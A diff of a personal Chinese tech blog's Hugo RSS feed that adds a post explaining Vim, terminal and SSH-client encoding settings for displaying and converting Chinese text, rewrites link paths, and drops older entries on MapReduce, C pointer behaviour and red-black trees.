@@ -2,19 +2,155 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Zea&#39;s</title>
-    <link>/</link>
+    <link>hanjc.me/</link>
     <description>Recent content on Zea&#39;s</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Sun, 06 Jul 2014 10:59:17 -0700</lastBuildDate>
-    <atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 27 Aug 2015 18:31:48 +0800</lastBuildDate>
+    <atom:link href="hanjc.me/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Linux下VIM编码设置——解决中文乱码问题</title>
+      <link>/hanjc.me/post/2015-08-27-Xshell-VIM-encoding/</link>
+      <pubDate>Thu, 27 Aug 2015 18:31:48 +0800</pubDate>
+      
+      <guid>/hanjc.me/post/2015-08-27-Xshell-VIM-encoding/</guid>
+      <description>
+
+&lt;p&gt;日常工作与生活中经常需要在Windows下通过Xshell、Putty等SSH客户端远程连接Linux服务器，
+在这种场景下使用Vim编辑器查看与录入中文经常会遇到乱码问题。
+此外，网上也有很多文章提到过使用Vim将GBK编码的文件转换为UTF-8编码的方法，
+这种文件编码的转换在远程Vim的情况下尤其应当小心操作，并提前备份，否则一旦转换失败可能再也难以恢复。
+本文记录了一些远程Vim配置方面的心得，希望对大家有所帮助。&lt;/p&gt;
+
+&lt;p&gt;远程Vim的工作原理可以简单地理解为从文件读取数据，将数据从&lt;strong&gt;文件的存储编码&lt;/strong&gt;转换到终端可识别的&lt;strong&gt;终端编码&lt;/strong&gt;，
+终端将数据流转发给SSH客户端，SSH客户端则根据客户端内配置的&lt;strong&gt;SSH客户端编码&lt;/strong&gt;来对数据流解码，并将内容呈现给用户。
+这三个编码我们最关心的是文件的存储编码，然而在配置的时候必须保证三个编码都配置正确，才能正确地显示和转换中文。&lt;/p&gt;
+
+&lt;h3 id=&#34;正确的配置-utf-8:6b2cc54d300b512f7a11f2054528901a&#34;&gt;正确的配置（UTF-8）&lt;/h3&gt;
+
+&lt;p&gt;废话少说，先来看正确的配置是怎样的，以及如何正确地配置。&lt;/p&gt;
+
+&lt;p&gt;首先，&lt;strong&gt;终端编码与SSH客户端编码需保持一致&lt;/strong&gt;，客户端编码的查看与配置方法各有差异，在此不作分析；终端编码可通过如下命令查看：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;locale charmap
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;如果不是UTF-8的话（默认为ISO-8859-1），可以通过修改环境变量&lt;code&gt;LANG&lt;/code&gt;和&lt;code&gt;LC_ALL&lt;/code&gt;来修改，将如下两行添加进&lt;code&gt;.bashrc&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;export LANG=&#39;en_US.UTF-8&#39;
+export LC_ALL=&#39;en_US.UTF-8&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这时再通过&lt;code&gt;locale&lt;/code&gt;命令查看终端编码应该已经变成UTF-8了。&lt;/p&gt;
+
+&lt;p&gt;接下来要配置Vim，在正确地配置了终端编码为UTF-8之后，将下面一行添加进.vimrc即可：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;set fencs=utf-8, gbk
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;注意：无需配置&lt;code&gt;fenc&lt;/code&gt;、&lt;code&gt;enc&lt;/code&gt;、&lt;code&gt;tenc&lt;/code&gt;这三个变量！&lt;/p&gt;
+
+&lt;p&gt;至此，Vim显示中文的问题应该可以完美解决了！&lt;/p&gt;
+
+&lt;h3 id=&#34;vim配置解析:6b2cc54d300b512f7a11f2054528901a&#34;&gt;Vim配置解析&lt;/h3&gt;
+
+&lt;p&gt;前边快速地描述了应当如何配置Vim，但并未详细解释这几个选项的作用，但若要做到清楚明白地使用Vim转换文件编码，
+了解这些选项的意义还是很有必要的。&lt;/p&gt;
+
+&lt;p&gt;Vim与编码相关的配置选项有四个，分别是&lt;code&gt;fileencodings(fencs)&lt;/code&gt;，&lt;code&gt;fileencoding(fenc)&lt;/code&gt;，
+&lt;code&gt;encoding(enc)&lt;/code&gt;和&lt;code&gt;termencoding(tenc)&lt;/code&gt;，其中
+&lt;code&gt;fencs&lt;/code&gt;为一个编码列表，当打开一个文件时，Vim会依次尝试利用列表中的编码去解读文件内容；
+&lt;code&gt;fenc&lt;/code&gt;告诉Vim以哪种编码保存文件内容；
+&lt;code&gt;enc&lt;/code&gt;告诉Vim将文件内容转为哪种编码存储在Vim工作缓冲区内；
+&lt;code&gt;tenc&lt;/code&gt;告诉Vim将缓冲区内的编码转换为何种编码发送给终端。&lt;/p&gt;
+
+&lt;p&gt;当Vim打开一个文件的时候，会首先读取&lt;code&gt;fencs&lt;/code&gt;列表，并尝试以第一个编码去解码文件内容，如果失败则继续尝试第二个，
+直到找到一个解码成功的编码，&lt;strong&gt;并将&lt;/strong&gt;&lt;code&gt;fenc&lt;/code&gt;&lt;strong&gt;变量设为该编码&lt;/strong&gt;。如果列表内的编码全部解码失败，则设置&lt;code&gt;fenc&lt;/code&gt;变量为空字符串。&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;enc&lt;/code&gt;选项为Vim工作区内容编码，即Vim工作缓存内文件内容的编码，
+该编码对用户并不可见，默认为ISO-8859-1（latin1），一般情况下不需要配置。
+Vim打开文件时，会从&lt;code&gt;fencs&lt;/code&gt;列表内匹配编码，并将文件内容从该编码转换为&lt;code&gt;enc&lt;/code&gt;编码存储在Vim进程的内存里。&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;fenc&lt;/code&gt;为文件保存编码，当Vim存储一个文件时，会将工作内存内缓存的内容由&lt;code&gt;enc&lt;/code&gt;编码转换为&lt;code&gt;fenc&lt;/code&gt;编码，并写道相应的文件里。
+需要注意的是&lt;code&gt;fenc&lt;/code&gt;选项在Vim启动时会根据&lt;code&gt;fencs&lt;/code&gt;设定，因此在.vimrc内配置&lt;code&gt;fenc&lt;/code&gt;并没有意义，
+一般只有在需要进行文件编码转换的时候会动态设定该选项的值。
+如果&lt;code&gt;fenc&lt;/code&gt;选项为空字符串，则默认使用&lt;code&gt;enc&lt;/code&gt;选项所指定的编码保存文件。&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;tenc&lt;/code&gt;告诉Vim终端编码类型，Vim会将缓冲区内容由&lt;code&gt;enc&lt;/code&gt;编码转换为&lt;code&gt;tenc&lt;/code&gt;编码之后发送给终端渲染。
+与&lt;code&gt;fenc&lt;/code&gt;类似，如果&lt;code&gt;tenc&lt;/code&gt;为空字符串，则不进行转换，直接输出&lt;code&gt;enc&lt;/code&gt;编码到终端。&lt;/p&gt;
+
+&lt;p&gt;如果你对这些编码转来转去的感觉比较麻烦，一个简单不会出错的方法就是把这些全部都设为UTF-8，世界就清净了 (=&lt;/p&gt;
+
+&lt;h4 id=&#34;文件编码转换:6b2cc54d300b512f7a11f2054528901a&#34;&gt;文件编码转换&lt;/h4&gt;
+
+&lt;p&gt;在进行文件编码转换之前，最好保证上述配置都正确无误（都是UTF-8），并且你的Vim可以正确地解读目标文件编码内容，
+简单来说就是&lt;code&gt;fenc&lt;/code&gt;不是空字符串（这一点很重要，在后面会详细讲述），那么此时你的状态应当是，Vim知道源文件编码，
+缓冲区内的编码为&lt;code&gt;enc&lt;/code&gt;，此时若要进行编码转换，只需在Vim内执行命令（假设UTF-8转GBK）：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;:set fenc=gbk
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;之后保存的时候，Vim就会自动将缓冲区内容从&lt;code&gt;enc&lt;/code&gt;转到新的&lt;code&gt;fenc&lt;/code&gt;编码保存了。&lt;/p&gt;
+
+&lt;h3 id=&#34;我能显示中文就是配置正确了么:6b2cc54d300b512f7a11f2054528901a&#34;&gt;我能显示中文就是配置正确了么？&lt;/h3&gt;
+
+&lt;p&gt;答案当然是&lt;strong&gt;否定&lt;/strong&gt;的，而且我就在这个问题上栽过跟头。&lt;/p&gt;
+
+&lt;p&gt;远程Vim过程中，可以“正常显示”中文意味着什么呢？答案是，终端发送给SSH客户端的数据被正确地解码了。
+但是，这并不代表你的配置是正确的了，在这种场景下进行文件编码转换是&lt;strong&gt;非常危险&lt;/strong&gt;的行为！&lt;/p&gt;
+
+&lt;p&gt;举一个配置错误、转换错误但是显示正常的例子吧。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;LANG=&#39;en_US&#39;
+LC_ALL=&#39;en_US&#39;
+fencs=utf-8,gbk
+Xshell encoding=&#39;gbk&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此时，终端编码为latin1，Vim内部编码亦为latin1，打开一个GBK编码的中文文件，中文却是可以正常显示的！
+其根本原因在于，&lt;strong&gt;GBK和latin1都是ASCII编码方式&lt;/strong&gt;（使用latin1来解码GBK数据流并不会出错，只是会出现乱码），
+尝试用latin1编码打开GBK编码的文件&lt;strong&gt;并不会进行实质上的编码转换&lt;/strong&gt;，终端把它认为是latin1编码的内容发送给Xshell，
+Xshell只要使用GBK编码解码，就依然可以正确地显示中文。&lt;/p&gt;
+
+&lt;p&gt;但是，这种情况下如果尝试通过修改&lt;code&gt;fenc&lt;/code&gt;来进行文件编码转换（希望从GBK转到UTF-8），就会出现问题，
+因为Xshell虽然知道文件内容是GBK编码，但是Vim并不知道，Vim会尝试把文件内容从latin1转换到UTF-8保存。
+这一步转换并不会报错，只是转出来的UTF-8并不是你想要的UTF-8罢了，
+因为从GBK转UTF-8会遇到2个字节（一个汉字）转一个UTF-8的情况，而latin1转UTF-8都是单字节转一个UTF-8编码，
+如果把转换之后的文件拷到Windows下使用Sublime等编辑器打开，就会发现全部都是乱码。&lt;/p&gt;
+
+&lt;p&gt;好玩儿的是，虽然Windows下看该UTF-8文件是乱码，同样的配置下在远程Vim里依然可以“正确”地解读该UTF-8文件。
+原因也很简单，Vim打开该文件发现是UTF-8编码，会将UTF-8转换为内部缓冲编码latin1，这实际上还原了原本的GBK编码，
+使得Xshell可以继续以GBK解码该文件了，但是如果尝试使用&lt;code&gt;iconv&lt;/code&gt;把这个UTF-8文件直接转换为GBK就会报错了。&lt;/p&gt;
+
+&lt;p&gt;因此，为了避免不必要的麻烦，日常工作中还是建议将终端编码、SSH客户端编码都设为UTF-8。&lt;/p&gt;
+
+&lt;h3 id=&#34;gbk-vs-utf-8:6b2cc54d300b512f7a11f2054528901a&#34;&gt;GBK vs. UTF-8&lt;/h3&gt;
+
+&lt;p&gt;根据前文可以看出来，由于GBK本质上是ASCII编码，因此单纯读取文件内容是无法判断其具体编码的（利用latin1和GBK去解码都正确），
+而UTF-8编码的文件会有标示，编辑器可以非常清晰的分辨出这个文件确实是UTF-8编码的文件，因此UTF-8编码在实际使用过程中更不容易出问题，
+乱码也就不太会出现了。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Placeholder for Notes</title>
+      <link>/hanjc.me/notes/placeholder/</link>
+      <pubDate>Thu, 20 Aug 2015 17:46:35 +0800</pubDate>
+      
+      <guid>/hanjc.me/notes/placeholder/</guid>
+      <description>
+
+&lt;h1 id=&#34;hello-world:394e6acbe333d11bb02cd8153aec9aa7&#34;&gt;Hello World&lt;/h1&gt;
+</description>
+    </item>
     
     <item>
       <title>Windows 下使用 Cocos2d-x 3.x &#43; Lua 开发基础</title>
-      <link>/post/2014-07-06-cocos2d-lua-basic/</link>
+      <link>/hanjc.me/post/2014-07-06-cocos2d-lua-basic/</link>
       <pubDate>Sun, 06 Jul 2014 10:59:17 -0700</pubDate>
       
-      <guid>/post/2014-07-06-cocos2d-lua-basic/</guid>
+      <guid>/hanjc.me/post/2014-07-06-cocos2d-lua-basic/</guid>
       <description>
 
 &lt;p&gt;&lt;a href=&#34;http://cocos2d-x.org/&#34;&gt;Cocos2d-x&lt;/a&gt; 是国内非常成熟的 2d 游戏开发引擎了，拥有非常广大的开发者群体和活跃的社区，支持 Windows、Linux、Mac OS、iOS、Android 和 Window Phone 等各个平台，其本身是用 C++ 语言实现的，主要提供了面向 C++ 的接口，也提供了对 Lua、object-c 和 JavaScript 的支持。我们的 minigame 要基于 Cocos（为简单起见，我就把 Cocos2d-x 称为 Cocos 了） 和 Lua 实现，这有好处也有弊端，Lua 作为一门脚本语言，开发起来确实非常快捷，不过 Cocos 社区 Lua 相关的文档和资料并不如 C++ 那么完备，使得上手的难度增加，而且 Lua 本质并不是面向对象的编程语言，我们编码时的一些 OO 的思想也要需要转变。&lt;/p&gt;
@@ -53,19 +189,19 @@
 
 &lt;p&gt;Cocos C++ 项目根目录如下：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;/images/blog/cocos-basic-cpp.png&#34; alt=&#34;&#34; /&gt;
+&lt;p&gt;&lt;img src=&#34;hanjc.me/images/blog/cocos-basic-cpp.png&#34; alt=&#34;&#34; /&gt;
 &lt;/p&gt;
 
 &lt;p&gt;其中 &lt;code&gt;/Classes&lt;/code&gt; 文件夹是主要的代码文件夹，开发者所需要写的全部代码文件都包含在这个文件夹中，&lt;code&gt;/Resources&lt;/code&gt; 则是资源文件夹，开发者的资源都存储在这个文件夹中，&lt;code&gt;/cocos2d&lt;/code&gt; 文件夹则包扩了 Cocos 完整的源代码。除此之外我们看到还有大量的 &lt;code&gt;/proj.xxxx&lt;/code&gt; 文件夹，这是 Cocos 为不同平台、不同编辑器生成的项目文件夹，所有这些项目均使用 &lt;code&gt;/Classes&lt;/code&gt; 中的源代码和 &lt;code&gt;/Resources&lt;/code&gt; 中的资源文件。&lt;/p&gt;
 
 &lt;p&gt;而 Cocos Lua 项目目录如下：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;/images/blog/cocos-basic-lua.png&#34; alt=&#34;&#34; /&gt;
+&lt;p&gt;&lt;img src=&#34;hanjc.me/images/blog/cocos-basic-lua.png&#34; alt=&#34;&#34; /&gt;
 &lt;/p&gt;
 
 &lt;p&gt;与 C++ 项目结构类似，Lua 项目所有的程序文件都在 &lt;code&gt;/src&lt;/code&gt; 文件夹下，资源文件都在 &lt;code&gt;/res&lt;/code&gt; 文件夹下，&lt;code&gt;/frameworks&lt;/code&gt; 包含了 Cocos 的完整源代码以及各个项目文件夹， 如下图所示为 &lt;code&gt;/frameworks/runtime-src&lt;/code&gt; 文件夹的结构：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;/images/blog/cocos-basic-lua-runtime-src.png&#34; alt=&#34;&#34; /&gt;
+&lt;p&gt;&lt;img src=&#34;hanjc.me/images/blog/cocos-basic-lua-runtime-src.png&#34; alt=&#34;&#34; /&gt;
 &lt;/p&gt;
 
 &lt;p&gt;而 &lt;code&gt;/runtime&lt;/code&gt; 文件夹内则包含了生成的个平台的可执行代码。&lt;/p&gt;
@@ -139,10 +275,10 @@
     
     <item>
       <title>暑期实习开始</title>
-      <link>/post/2014-07-05-summer-intern/</link>
+      <link>/hanjc.me/post/2014-07-05-summer-intern/</link>
       <pubDate>Sat, 05 Jul 2014 21:44:53 -0700</pubDate>
       
-      <guid>/post/2014-07-05-summer-intern/</guid>
+      <guid>/hanjc.me/post/2014-07-05-summer-intern/</guid>
       <description>&lt;p&gt;记得很清楚，拿到网易暑期实习 offer 是 4 月 30 号，正好是劳动节放假前一天，当时真的是很开心，感觉实习终于有着落了，而且还是我的首选网易游戏，所以那个劳动节过的格外开心。实习从 7 月开始，6 月末收到公司邮件通知，从 6 月 29 号开始就可以去杭州报道了，这点不得不称赞网易，对实习生的待遇非常不错，公司食堂免费吃，还提供住宿，不过因为实习生较多，公司的宿舍不够用了，所以我被分在了公司附近的乐通酒店。去之前特意查了下地图，发现公司提供住宿的几家酒店里乐通是离得最近的，跟公司只隔了一个街区，走路 10 分钟妥妥儿的，这一点还是非常方便的。&lt;/p&gt;
 
 &lt;p&gt;我跟几个朋友一起，乘坐 29 号的火车来杭州，出了火车站几个人做的第一件事就是去办了张杭州一卡通，可以租自行车的那种，后来证明这个举动真是太明智了，因为我跟老缪出了地铁站之后就是租量小车慢慢悠悠骑到乐通的。我们就这样，骑着租来的橘黄色的小破车，拖着的拉杆箱，慢慢悠悠的开始了暑期杭州的日子。&lt;/p&gt;
@@ -164,10 +300,10 @@
     
     <item>
       <title>如何写 Ubuntu 的 Framebuffer</title>
-      <link>/post/2014-05-20-ubuntu-fbvnc/</link>
+      <link>/hanjc.me/post/2014-05-20-ubuntu-fbvnc/</link>
       <pubDate>Tue, 20 May 2014 20:26:25 +0800</pubDate>
       
-      <guid>/post/2014-05-20-ubuntu-fbvnc/</guid>
+      <guid>/hanjc.me/post/2014-05-20-ubuntu-fbvnc/</guid>
       <description>
 
 &lt;p&gt;最近有个小项目，想在 Android 上跑一个通过直接读写 framebuffer 实现的 vnc 客户端，
@@ -292,39 +428,11 @@ include $(BUILD_EXECUTABLE)
     </item>
     
     <item>
-      <title>6.824 Lab1 MapReduce Notes</title>
-      <link>/post/2014-04-09-6-dot-824-mapreduce-notes/</link>
-      <pubDate>Wed, 09 Apr 2014 22:01:37 +0800</pubDate>
-      
-      <guid>/post/2014-04-09-6-dot-824-mapreduce-notes/</guid>
-      <description>
-
-&lt;p&gt;作为 MIT 6.824 &lt;em&gt;分布式系统&lt;/em&gt; 这门课的第一个 Lab，其主要的目的是让学生熟悉下 Go 语言，因此不是特别难。事实上，2013 年的 Lab1 是做一个 P/B 架构的 LockService，感觉今年的这个 MapReduce 难度上有所下降，更加适合上手，而内容方面涉及了 MapReduce 的简单应用和实现，做完之后收获更大，总的来说整体水准高于去年的 LockService。&lt;/p&gt;
-
-&lt;p&gt;Lab 共分为三个部分，Part I 要求在 MapReduce 上实现一个 WordCount，因为大部分的 MapReduce 框架都已经实现好了，所以这部分非常简单；支持代码（ Support code ）中的 MapReduce 是个非常简化的版本，没有 Master，顺序执行每一个 Map 和 Reduce 操作，Part II 的要求是实现一个简单的 Master； Part III 要在 Part II 的基础之上实现容忍客户端失败的情况。&lt;/p&gt;
-
-&lt;p&gt;总的来讲，这个 Lab 中我们只需要实现一个简化版的 MapReduce 中的 Master Node 的逻辑部分。&lt;/p&gt;
-
-&lt;h3 id=&#34;part-i:9d64eb79111af9673b332797623c91f4&#34;&gt;Part I&lt;/h3&gt;
-
-&lt;p&gt;只有一点点代码要写，不过在动手之前还是要认真阅读支持代码，主要需要搞明白的是 Map 和 Reduce 函数的输入输出分别是什么：&lt;/p&gt;
-
-&lt;p&gt;``` go wc.go
-func Map(value string) *list.List {}&lt;/p&gt;
-
-&lt;p&gt;func Reduce(key string, values *list.List) string {}
-```&lt;/p&gt;
-
-&lt;p&gt;为此需要看一看 mapreduce.go 中 DoMap 和 DoReduce 这两个方法。&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
       <title>简单的递归和动态规划</title>
-      <link>/post/2014-04-05-recursion-and-dp/</link>
+      <link>/hanjc.me/post/2014-04-05-recursion-and-dp/</link>
       <pubDate>Sat, 05 Apr 2014 13:31:50 +0800</pubDate>
       
-      <guid>/post/2014-04-05-recursion-and-dp/</guid>
+      <guid>/hanjc.me/post/2014-04-05-recursion-and-dp/</guid>
       <description>
 
 &lt;h3 id=&#34;题目-wordbreak:53826fc2dcb894551367a127137aed4e&#34;&gt;题目：WordBreak&lt;/h3&gt;
@@ -435,234 +543,11 @@ bool stat(n) {
     </item>
     
     <item>
-      <title>printf_in_c</title>
-      <link>/post/2014-04-04-printf-in-c/</link>
-      <pubDate>Fri, 04 Apr 2014 21:48:15 +0800</pubDate>
-      
-      <guid>/post/2014-04-04-printf-in-c/</guid>
-      <description>&lt;p&gt;这两天讨论起 c 中&lt;code&gt;*p++&lt;/code&gt;的行为，特意写了个小程序想要验证一下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;main () {
-	int a[3] = {0xdeaa, 0xdeab, 0xdeac};
-	int *p = a;
-	int *p1 = a;
-	int *p2 = a;
-	
-	printf(&amp;quot;%x, %x, %x\n&amp;quot;,  (int)(*p++), (int)(*(p1++)), (int)(++(*p2)));
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;!-- more --&gt;
-
-&lt;p&gt;我期待的输出结果是这样的：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;0xdeaa, 0xdeaa, 0xdeab
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;然而实际的输出却是这样的：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;0xdeab, 0xdeab, 0xdeaa
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;完完全全相反啊妈蛋！我心目中的&lt;code&gt;*p++&lt;/code&gt;应该是先执行&lt;code&gt;p++&lt;/code&gt;，然后返回未增加之前 p 的值 pp，之后对 pp 进行解引用，最终返回&lt;code&gt;*pp&lt;/code&gt;的值，而 p 应该等于 pp+4。执行效果等价于&lt;code&gt;(*p); p++&lt;/code&gt;，但是从输出结果看来仿佛是&lt;code&gt;p++; (*p)&lt;/code&gt;，肯定是哪里不对。&lt;/p&gt;
-
-&lt;p&gt;观察发现 a[0]+1 的值和 a[1] 相等，都是 0xdeab，因此事实上并不能知道输出的 0xdeab 到底是怎么来的，所以首先把数组 a 的初始值改成&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;int a[3] = {0xdea0, 0xdea5, 0xdeaa};
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;这次的输出是&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;0xdea1, 0xdea1, 0xdea0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;所以，看来并不如想像的那样，仿佛&lt;code&gt;*p++&lt;/code&gt;被执行成了&lt;code&gt;(*p)++&lt;/code&gt;了。但这是不对的，而且就算是后者，也应该是先返回 *p 的值，然后再加对 p 所指向的内存加 1。而且毫无疑问第一个输出&lt;code&gt;*p++&lt;/code&gt;会影响第二个输出&lt;code&gt;*(p1++)&lt;/code&gt;的结果，所以事实并不是这样。不如来看下汇编吧：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;00000000004004f4 &amp;lt;main&amp;gt;:
-  4004f4:   55                      push   %rbp
-  4004f5:   48 89 e5                mov    %rsp,%rbp
-  4004f8:   48 83 ec 30             sub    $0x30,%rsp
-  4004fc:   c7 45 d0 a0 de 00 00    movl   $0xdea0,-0x30(%rbp) // a[0]
-  400503:   c7 45 d4 a5 de 00 00    movl   $0xdea5,-0x2c(%rbp) // a[1]
-  40050a:   c7 45 d8 aa de 00 00    movl   $0xdeaa,-0x28(%rbp) // a[2]
-  400511:   48 8d 45 d0             lea    -0x30(%rbp),%rax    
-  400515:   48 89 45 f8             mov    %rax,-0x8(%rbp)     // p
-  400519:   48 8d 45 d0             lea    -0x30(%rbp),%rax    
-  40051d:   48 89 45 f0             mov    %rax,-0x10(%rbp)    // p1
-  400521:   48 8d 45 d0             lea    -0x30(%rbp),%rax
-  400525:   48 89 45 e8             mov    %rax,-0x18(%rbp)    // p2
-  400529:   48 8b 45 e8             mov    -0x18(%rbp),%rax    // rax = p2
-  40052d:   8b 00                   mov    (%rax),%eax         // eax = *p2 = 0xdea0
-  40052f:   8d 50 01                lea    0x1(%rax),%edx      // edx = eax + 1
-  400532:   48 8b 45 e8             mov    -0x18(%rbp),%rax    // rax = p2
-  400536:   89 10                   mov    %edx,(%rax)
-  400538:   48 8b 45 e8             mov    -0x18(%rbp),%rax
-  40053c:   8b 08                   mov    (%rax),%ecx
-  40053e:   48 8b 45 f0             mov    -0x10(%rbp),%rax
-  400542:   8b 10                   mov    (%rax),%edx
-  400544:   48 83 45 f0 04          addq   $0x4,-0x10(%rbp)
-  400549:   48 8b 45 f8             mov    -0x8(%rbp),%rax
-  40054d:   8b 00                   mov    (%rax),%eax
-  40054f:   48 83 45 f8 04          addq   $0x4,-0x8(%rbp)
-  400554:   89 c6                   mov    %eax,%esi
-  400556:   bf 5c 06 40 00          mov    $0x40065c,%edi
-  40055b:   b8 00 00 00 00          mov    $0x0,%eax
-  400560:   e8 8b fe ff ff          callq  4003f0 &amp;lt;printf@plt&amp;gt;
-  400561:   c9                      leaveq 
-  400562:   c3                      retq   
-  400563:   90                      nop
-&lt;/code&gt;&lt;/pre&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>ds-tree</title>
-      <link>/post/2014-03-31-ds-tree/</link>
-      <pubDate>Mon, 31 Mar 2014 21:21:33 +0800</pubDate>
-      
-      <guid>/post/2014-03-31-ds-tree/</guid>
-      <description>
-
-&lt;h2 id=&#34;binary-search-tree:668551676aee55c1093deeefc0b62506&#34;&gt;Binary Search Tree&lt;/h2&gt;
-
-&lt;h3 id=&#34;avl-tree:668551676aee55c1093deeefc0b62506&#34;&gt;AVL Tree&lt;/h3&gt;
-
-&lt;p&gt;查询较快，适用于&lt;strong&gt;一次构造、多次查询&lt;/strong&gt;的需求。&lt;/p&gt;
-
-&lt;h3 id=&#34;red-black-tree:668551676aee55c1093deeefc0b62506&#34;&gt;Red-Black Tree&lt;/h3&gt;
-
-&lt;p&gt;相比平衡二叉树，红黑树在平衡性上限制并不严格，因此红黑树的修改操作（插入、删除）性能更优，但是查询操作稍慢。&lt;/p&gt;
-
-&lt;h4 id=&#34;insertion:668551676aee55c1093deeefc0b62506&#34;&gt;Insertion&lt;/h4&gt;
-
-&lt;p&gt;插入时首先找到要替换的叶子结点，用一个红色结点来代替，该红色结点的值即为要插入的值，节点的两个子节点为黑色的 NIL。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;property 3&lt;/strong&gt; (叶子结点均为黑色) 总是成立。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;property 4&lt;/strong&gt; (红色结点的两个孩子都是黑色节点) 下列情况可能会不成立：添加一个红色结点，把一个黑色结点变成红色，旋转&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;property 5&lt;/strong&gt; (从根到叶子结点的所有路径上包含的黑色结点的数量相同) 下列情况可能会不成立：添加黑色结点，改变结点颜色，旋转&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Note: N, 当前节点; P, N 的父节点; G, N 的祖父; U, N 的叔叔（P 的兄弟）&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Case 1:&lt;/strong&gt; N 为根, 改变其颜色为黑；&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void insert_case1(struct node *n)
-{
- if (n-&amp;gt;parent == NULL)
-  n-&amp;gt;color = BLACK;
- else
-  insert_case2(n);
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Case 2:&lt;/strong&gt; P 为黑色，所有限制均满足，不需要变化；&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void insert_case2(struct node *n)
-{
-if (n-&amp;gt;parent-&amp;gt;color == BLACK)
-  return; /* Tree is still valid */
-else
-  insert_case3(n);
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Case 3:&lt;/strong&gt; P 和 U 都是红色，则改变 P 和 U 为黑色，同时把 G 变成红色。此时 G 可能违反了限制2和4，需要递归的调整&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void marnsert_case3(struct node *n)
-{
-struct node *u = uncle(n), *g;
-
-if ((u != NULL) &amp;amp;&amp;amp; (u-&amp;gt;color == RED)) {
-  n-&amp;gt;parent-&amp;gt;color = BLACK;
-  u-&amp;gt;color = BLACK;
-  g = grandparent(n);
-  g-&amp;gt;color = RED;
-  insert_case1(g);
-} else {
-  insert_case4(n);
-}
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Case 4:&lt;/strong&gt; P 是红色而 U 是黑色，且 N 是 P 的右子结点，则对 P 坐一次左旋操作，转为 Case 5；&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void insert_case4(struct node *n)
-{
- struct node *g = grandparent(n);
- 
- if ((n == n-&amp;gt;parent-&amp;gt;right) &amp;amp;&amp;amp; (n-&amp;gt;parent == g-&amp;gt;left)) {
-  rotate_left(n-&amp;gt;parent);
- 
- /*
- * rotate_left can be the below because of already having *g =  grandparent(n) 
- *
- * struct node *saved_p=g-&amp;gt;left, *saved_left_n=n-&amp;gt;left;
- * g-&amp;gt;left=n; 
- * n-&amp;gt;left=saved_p;
- * saved_p-&amp;gt;right=saved_left_n;
- * 
- * and modify the parent&#39;s nodes properly
- */
- 
-  n = n-&amp;gt;left; 
- 
- } else if ((n == n-&amp;gt;parent-&amp;gt;left) &amp;amp;&amp;amp; (n-&amp;gt;parent == g-&amp;gt;right)) {
-  rotate_right(n-&amp;gt;parent);
- 
- /*
- * rotate_right can be the below to take advantage of already having *g =  grandparent(n) 
- *
- * struct node *saved_p=g-&amp;gt;right, *saved_right_n=n-&amp;gt;right;
- * g-&amp;gt;right=n; 
- * n-&amp;gt;right=saved_p;
- * saved_p-&amp;gt;left=saved_right_n;
- * 
- */
- 
-  n = n-&amp;gt;right; 
- }
- insert_case5(n);
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ul&gt;
